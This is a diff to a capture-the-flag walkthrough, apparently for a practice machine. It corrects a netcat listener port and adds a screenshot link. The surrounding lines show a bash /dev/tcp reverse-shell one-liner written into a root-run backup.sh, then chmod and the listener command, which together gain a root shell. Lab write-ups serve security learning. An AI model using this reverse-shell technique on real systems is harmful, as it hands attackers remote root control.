@@ -296,7 +296,7 @@ change the file content to `bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`
 run a listener by netcat
 
 ```
-nc -vlnp 7777
+nc -vlnp 4444
 ```
 
 I forgot to check if the script file was set to executable or not, and I kept waiting for the reverse shell and it never connected back
@@ -309,7 +309,7 @@ chmod +x backup.sh
 
 ok now we got the reverse shell with root privileges
 
-
+![image](https://user-images.githubusercontent.com/90561566/196392720-b76682ef-ab69-4b50-91c4-b4380fec41a6.png)
 
 | Flag | flag4.txt |
 | --- | --- |
